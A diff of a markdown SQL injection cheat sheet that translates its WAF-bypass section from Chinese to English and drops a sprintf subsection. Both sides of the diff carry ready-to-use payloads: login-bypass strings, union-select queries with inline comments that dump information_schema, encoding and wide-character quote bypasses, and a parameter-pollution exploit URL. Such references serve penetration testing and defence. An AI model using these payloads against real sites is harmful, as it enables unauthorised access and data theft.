@@ -10,8 +10,7 @@ SQL is a famous database engine which is used with web server. In this situation
 *  [Read file](#read-file)  
 *  [sql privilege issue](#sql-privilege-issue)  
 *  [Bypass ASPX RequestValidation](#bypass-requestvalidation-on-aspx)  
-*  [sprintf/vprintf](#sprintf-vprintf)   
-*  [Wordpress4.8.2 double prepare漏洞用法](#wordpress-double-prepare-misuse)  
+*  [Wordpress4.8.2 double prepare](#wordpress-double-prepare-misuse)  
 *  [NoSQL injection](#nosql-injection)  
 *  [Logic Vul](#logic-vul)  
 *  [Tools](#tools)  
@@ -177,59 +176,59 @@ where table_schema=0xXXXXX
 
 ### WAF bypass
 WAF is a defender for web.  
-繞過手勢:  
-- 萬能密鑰繞過  
+Tricks:  
+- I want to login  
   - `id=1' or 1 like 1#`  
   - `') or '1'=1--`  
-- 空白繞過  
+- Space bypass  
   - `select/**/username/**/from/**/users;`  
-  - `select@{反引號}id{反引號}`  
+  - `select@{backtick}id{backtick}`(I wrap it with {} due to markdown syntax here)  
   - `union select 1,2` -> `union(select(1),2)`  
-  - `%20 %09 %0a %0b %0c %0d %a0 /**/`  
+  - `%20 %09(tab) %0a(line feed) %0b %0c %0d %a0 /**/` -> `id=1%0aand%0aip=2`  
   - aspx+mssql `%00`, php+mysql `/*%00*/`
-- 大小寫繞過  
-  - `大小寫混淆 e.g. SelecT`  
-- 雙關鍵字繞過  
+- Obfuscation with Upper Lowercase  
+  - `SelecT`  
+- Obfuscation with wrap  
   - `UNIunionON`  
-- 內聯注釋繞過(**實戰中這招可以繞過很多WAF，用注釋符替換空白以及作結，還可以用單個`*/`去閉合多個`/*!`**)  
-  - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`
-- 逗號繞過  
+- Inline comments(**It is useful to bypass waf in realworld**)  
+  - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`  
+- Comma bypass  
   - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
-  - limit逗號 `limit 1 offset 0`  
-  - mid()逗號 `mid(version() from 1 for 1)`
-- 編碼(or雙重)繞過  
+  - in use of limit `limit 1 offset 0`  
+  - in use of mid() `mid(version() from 1 for 1)`
+- Encoding(or double) bypass  
   - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
-  - `unicode(單引號): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
-  - `unicode(空白): %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0`  
-  - `unicode(左括號): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
-  - `unicode(右括號): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
+  - `unicode(quote): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
+  - `unicode(space): %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0`  
+  - `unicode(left bracket): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
+  - `unicode(right bracket): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
   - `Char(49)` `Hex('a')` `Unhex(61)`  
-  - asp+iis的server上有自動解析unicode的效果，url中的`%`字元會被忽略掉，`s%u0065lect`的unicode字串會被自動解析  
-  - `IBM037`,`IBM500`,`IBM1026`,`cp875`等特殊字集，細節請看[用特殊編碼繞過waf](#bypass-requestvalidation-on-aspx)  
-- 注釋  
-  - `#`  行內注釋  
+  - On asp+iis, server can parse unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as select  
+  - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on, take a look at [bypass waf with encoding](#bypass-requestvalidation-on-aspx)  
+- Comment  
+  - `#`    
   - `--+` `--` `-- -`  
-  - `/* ... */` `///**/`(多個自己變通)段注釋，可多行  
-  - {反引號} 特定情況下可作為注釋  mysql <= 5.5  
-  - `;` stacking queries 一般php+mysql不可行，但是PDO行得通  
-- 命令繞過  
+  - `/* ... */` `///**/`(multiple lines)  
+  - {backtick} can be used as comment if  mysql <= 5.5  
+  - `;` stacking queries cannot be used in mysql query+php, but works in PDO  
+- Command bypass  
   - `sleep()` -> `benchmark()`  
   - `@@datadir` -> `datadir()`  
-- 邏輯運算符繞過  
+- Logic operator  
   - `and/or` -> `&& / |`  
-- 寬字節繞過  
-  - 過濾單引號： `%bf%27 %df%27 %aa%27`  
-- `information_schema`被禁掉  
-  - 爆庫名：`select * from users where name = helloworld();`  
-    原理：`ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
-- aspx中HPP特性  
-  - 當GET/POST/COOKIE同時提交參數`uid`，server會依GET/POST/COOKIE的順序接收並以逗號隔開  
-  - 利用：`http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
-- 函數分隔符  
-  - func名和後面括號之間其實可以有分隔，這導致正規表達式可以被繞過  
+- Wide char  
+  - bypass single quote： `%bf%27 %df%27 %aa%27`  
+- `information_schema` bypass  
+  - get database name：`select * from users where name = helloworld();`  
+    `ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
+- HPP on asp  
+  - When GET/POST/COOKIE submit `uid` at the same time, server would follow GET/POST/COOKIE to receive and split them with comma  
+  - Exploit: `http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
+- Function separator  
+  - In fact, there can be someting between func name and left bracket, this can be used to bypass regex  
   - function `/**/`,`%2520`,`%250c`,`%25a0` ()  
     
-更多的思路：  
+More：  
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
 
 ### Webshell
@@ -318,10 +317,6 @@ Exploit:
 果然編碼的攻擊方式還是很強大，我們可以透過限制charset的值來避免這種攻擊方式  
 [Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
 [Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  
-
-### sprintf vprintf
-不會檢查格式化字串的類型。  
-SQLi中，```%'```會被轉譯成`\'` -> `%\'` `%\`被吃掉，`'`逃逸。  
 
 ### Wordpress Double Prepare Misuse  
 Wordpress自己寫了`prepare()`預編譯sql語句然後再`execute()`，有別於PDO下的`prepare()`,`blind()`,`execute()`。這是出現在wordpress4.8.3以前的版本的問題...  
